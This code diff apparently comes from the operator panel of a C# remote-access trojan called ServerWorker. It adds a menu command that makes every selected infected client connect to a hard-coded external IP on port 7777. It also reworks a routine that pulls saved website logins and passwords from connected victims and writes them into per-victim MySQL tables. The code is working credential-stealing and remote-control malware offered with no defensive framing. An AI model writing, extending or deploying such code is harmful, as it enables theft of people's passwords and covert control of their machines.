@@ -54,6 +54,7 @@ namespace ServerWorker
             InitContextMenuStrip();
             mainControls.Add(button1);
             secondControls.Add(button8);
+
         }
 
         private void InitContextMenuStrip()
@@ -99,6 +100,14 @@ namespace ServerWorker
                     users.Add(ServerNet.ConnectedUsers.ToArray()[index]);
                 }
                 GetPass(users);
+            };
+            menu.Items.Add("Connect");
+            menu.Items[6].Click += (object sender, EventArgs e) =>
+            {
+                foreach (int index in listView1.SelectedIndices)
+                {
+                    ServerNet.ConnectedUsers.ToArray()[index].UsersCom.ConnectToHost("31.207.224.61", 7777);
+                }
             };
         }
 
@@ -252,18 +261,23 @@ namespace ServerWorker
             foreach (User user in users)
             {
                 var loginDataList = user.UsersCom.SendLoginData("");
-                MySQLData data = new MySQLData() { Table = "LoginData", Columns = new string[] { "Site", "Login", "Password", "UserId" } };
+                DateTime now = DateTime.Now;
+                var tableName = now.ToString("yyyy.MM.dd");
+                tableName += " " + now.ToString("HH:mm:ss");
+                tableName += " " + user.userData.id;
+
+                MySQLData data = new MySQLData() { Table = tableName, Columns = new string[] { "Site", "Login", "Password"} };
                 foreach (LoginData loginData in loginDataList)
                 {
                     if (!string.IsNullOrWhiteSpace(loginData.WebSite) || !string.IsNullOrWhiteSpace(loginData.Login) || !string.IsNullOrWhiteSpace(loginData.Pass))
-                        data.Values.Add(new string[] { loginData.WebSite, loginData.Login, loginData.Pass, user.userData.id });
+                        data.Values.Add(new string[] { loginData.WebSite, loginData.Login, loginData.Pass});
                 }
 
                 var dataCount = data.Values.Count;
                 if (dataCount > 0)
                 {
+                    MySQLManager.CreateTable(tableName);
                     MySQLManager.Send(data);
-
                 }
                 else MessageBox.Show("Паролей не найдено");
 
